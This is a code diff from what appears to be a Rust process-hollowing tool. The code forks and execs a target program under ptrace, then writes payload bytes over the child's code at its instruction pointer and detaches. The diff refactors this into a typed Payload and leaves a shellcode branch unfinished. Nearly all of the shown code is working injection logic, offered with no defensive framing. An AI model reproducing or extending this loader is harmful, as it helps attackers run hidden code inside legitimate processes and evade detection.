@@ -12,35 +12,42 @@ use nix::unistd::{execve, fexecve, fork, ForkResult};
 use crate::utils::{get_env, str_to_vec_c_string};
 use crate::{Payload, PayloadType};
 
-pub fn hollow(target: &str, args: &str, shellcode_bytes: &[u8]) -> Result<(), Errno> {
+pub fn hollow(payload: Payload) -> Result<(), Errno> {
     match unsafe { fork() } {
         Ok(ForkResult::Parent { child, .. }) => {
             waitpid(child, None)?;
 
-            let regs = getregs(child)?;
+            match payload.payload_type {
+                PayloadType::Executable => {
+                    let regs = getregs(child)?;
 
-            let mut addr = regs.rip;
+                    let mut addr = regs.rip;
 
-            for byte in shellcode_bytes {
-                ptrace::write(child, addr as *mut c_void, *byte as i64)?;
-                addr += 1;
+                    for byte in &payload.bytes {
+                        ptrace::write(child, addr as *mut c_void, *byte as i64)?;
+                        addr += 1;
+                    }
+
+                    detach(child, None)?;
+                }
+                PayloadType::Shellcode => {
+                    todo!()
+                }
             }
-
-            detach(child, None)?;
         }
 
         Ok(ForkResult::Child) => {
             traceme()?;
 
-            let target_c_string = CString::new(target).unwrap();
+            let target_c_string = CString::new(payload.target).unwrap();
 
-            let parsed_args = str_to_vec_c_string(args);
-            let parsed_args_as_slice = parsed_args.as_slice();
+            let target_args = str_to_vec_c_string(&payload.target_args);
+            let target_args_slice = target_args.as_slice();
 
             let env = get_env();
-            let env_as_slice = env.as_slice();
+            let env_slice = env.as_slice();
 
-            execve(&target_c_string, parsed_args_as_slice, env_as_slice)?;
+            execve(&target_c_string, target_args_slice, env_slice)?;
         }
 
         Err(error) => println!("Fork failed: {}", error),
